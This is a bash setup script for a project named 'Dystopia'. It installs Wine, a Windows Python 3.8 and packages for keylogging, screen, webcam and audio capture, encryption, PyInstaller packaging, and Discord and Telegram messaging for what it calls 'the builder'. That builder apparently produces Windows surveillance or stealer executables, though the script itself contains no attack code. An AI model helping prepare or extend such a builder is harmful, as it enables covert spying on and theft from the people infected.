#!/usr/bin/env bash

set -e

echo "Starting Dystopia Setup..."

# Determine OS type
if [[ "$OSTYPE" == "linux-gnu"* ]]; then
    if [ -f /etc/os-release ]; then
        . /etc/os-release
        DISTRIB=$ID
    else
        DISTRIB="unknown"
    fi

    echo "Detected distribution: $DISTRIB"

    # Arch-based distributions
    if [[ ${DISTRIB} == "arch" || ${DISTRIB} == "manjaro" ]]; then
        echo "Updating Arch-based system..."
        sudo pacman -Syyu --noconfirm
        sudo pacman -S base-devel git --needed --noconfirm

        # Install yay if not present
        if ! command -v yay &> /dev/null; then
            echo "Installing yay..."
            git clone https://aur.archlinux.org/yay.git
            cd yay
            makepkg -si --noconfirm
            cd ..
            rm -rf yay
        fi

        yay -S python38 wine --noconfirm
        sudo pacman -S python-pip --noconfirm 
        pip3 install -r requirements.txt --break-system-packages || pip3 install -r requirements.txt || true

    # Debian-based distributions (Ubuntu, Kali, Debian)
    elif [[ ${DISTRIB} == "ubuntu" || ${DISTRIB} == "debian" || ${DISTRIB} == "kali" || ${ID_LIKE} == *"debian"* ]]; then
        echo "Updating Debian-based system..."
        sudo apt-get update
        sudo apt-get install -y python3 python3-pip wine wget xvfb

        # Add i386 architecture for wine32
        sudo dpkg --add-architecture i386
        sudo apt-get update
        sudo apt-get install -y wine32 || echo "wine32 installation failed, continuing..."

        echo "Installing Python dependencies for the builder..."
        pip3 install -r requirements.txt --break-system-packages || pip3 install -r requirements.txt || true
    else
        echo "Unsupported distribution: $DISTRIB. Trying general approach..."
        sudo apt-get update || true
        sudo apt-get install -y python3 python3-pip wine wget || true
        pip3 install -r requirements.txt --break-system-packages || pip3 install -r requirements.txt || true
    fi

    # Verify Wine installation
    if ! command -v wine &> /dev/null; then
        echo "Error: Wine is not installed. Please install Wine manually."
        exit 1
    fi

    # Check if Python is already installed in Wine
    PYTHON_EXE=$(find "$HOME/.wine" -name "python.exe" | grep "Python38-32" | head -n 1 || true)

    if [[ -z "$PYTHON_EXE" ]]; then
        echo "Searching in /root/.wine as fallback..."
        PYTHON_EXE=$(find "/root/.wine" -name "python.exe" | grep "Python38-32" | head -n 1 || true)
    fi

    if [[ -z "$PYTHON_EXE" ]]; then
        # Download Python 3.8.9 installer if not exists
        FILE=python-3.8.9.exe
        if [[ ! -f "$FILE" ]]; then
            echo "Downloading Python 3.8.9 for Windows..."
            wget https://www.python.org/ftp/python/3.8.9/python-3.8.9.exe
        fi

        # Determine installation mode (silent or not)
        QUIET_MODE=""
        for arg in "$@"; do
            if [[ "$arg" == "-s" ]]; then
                QUIET_MODE="/quiet"
                break
            fi
        done

        echo "Installing Python 3.8.9 in Wine..."
        # Using xvfb-run to avoid GUI errors if no X server is present
        if command -v xvfb-run &> /dev/null; then
            xvfb-run --auto-servernum wine cmd /c python-3.8.9.exe $QUIET_MODE InstallAllUsers=0 PrependPath=1 || echo "Wine installation command failed, might still have worked."
        else
            wine cmd /c python-3.8.9.exe $QUIET_MODE InstallAllUsers=0 PrependPath=1 || echo "Wine installation command failed, might still have worked."
        fi

        echo "Waiting for Wine to finish..."
        sleep 10

        # Find where it was installed
        PYTHON_EXE=$(find "$HOME/.wine" -name "python.exe" | grep "Python38-32" | head -n 1 || true)

        if [[ -z "$PYTHON_EXE" ]]; then
            echo "Searching in /root/.wine as fallback..."
            PYTHON_EXE=$(find "/root/.wine" -name "python.exe" | grep "Python38-32" | head -n 1 || true)
        fi
    else
        echo "Python 3.8.9 already installed in Wine: $PYTHON_EXE"
    fi

    if [[ -z "$PYTHON_EXE" ]]; then
        echo "[!] Could not find python.exe in Wine environment."
        echo "[!] You may need to install it manually using: wine python-3.8.9.exe"
    else
        echo "Found Python in Wine: $PYTHON_EXE"
        echo "Installing Python packages in Wine..."

        # Function to run pip commands via script to avoid invalid handle errors
        run_wine_pip() {
            local ARGS="$@"
            local CMD="wine \"$PYTHON_EXE\" -m pip install $ARGS"

            # Use xvfb-run if available to suppress GUI errors
            if command -v xvfb-run &> /dev/null; then
                CMD="xvfb-run --auto-servernum $CMD"
            fi

            if command -v script &> /dev/null; then
                script -q -c "$CMD" /dev/null
            else
                eval "$CMD"
            fi
        }

        run_wine_pip --upgrade pip
        run_wine_pip wheel
        run_wine_pip psutil==5.9.5
        run_wine_pip pillow==8.3.2 pyscreeze==0.1.28 pyautogui==0.9.52 keyboard==0.13.5
        run_wine_pip pywin32==303 pycryptodome==3.12.0 pyinstaller==5.3
        run_wine_pip discord_webhook==0.14.0 discord.py opencv-python==4.5.3.56
        run_wine_pip sounddevice scipy==1.9.0 pyTelegramBotAPI PyGithub
    fi
fi

echo "Setup Complete!"
